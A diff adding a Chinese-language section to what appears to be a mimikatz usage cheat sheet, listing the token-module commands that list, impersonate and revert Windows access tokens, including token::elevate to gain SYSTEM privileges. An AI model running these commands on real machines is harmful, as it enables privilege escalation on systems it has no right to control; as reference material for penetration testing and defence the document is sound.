@@ -646,3 +646,39 @@ mimikatz # process::suspend notepad /pid:9212
 
 
 # token
+
+## elevate
+可以用来冒充一个令牌。默认情况下，它将把权限提升到NT AUTHORITY/SYSTEM
+
+```
+mimikatz # token::elevate
+```
+
+## list
+
+枚举系统上所有的token
+```
+mimikatz # token::list
+```
+
+## revert
+恢复到之前的令牌
+
+```
+mimikatz # token::revert
+```
+
+## run
+执行一个带有其令牌的进程
+
+```
+mimikatz # token::run /process:explore.exe
+```
+
+## whoami
+
+显示当前token
+
+```
+mimikatz # token::whoami
+```
